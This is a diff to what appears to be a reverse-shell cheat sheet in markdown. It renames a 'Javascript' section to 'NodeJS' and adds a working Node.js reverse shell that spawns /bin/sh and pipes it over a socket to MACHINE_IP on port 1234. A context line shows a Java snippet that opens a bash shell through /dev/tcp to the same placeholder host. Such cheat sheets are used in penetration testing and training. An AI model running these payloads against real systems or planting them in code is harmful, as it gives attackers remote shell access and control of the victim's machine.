@@ -76,5 +76,23 @@ p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/MACHINE_IP/1234;cat <&5 | while r
 p.waitFor()
 ```
 
-### Javascript
+### NodeJS
 
+```javascript
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(1234, "MACHINE_IP", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+```
+
+
+```
+```
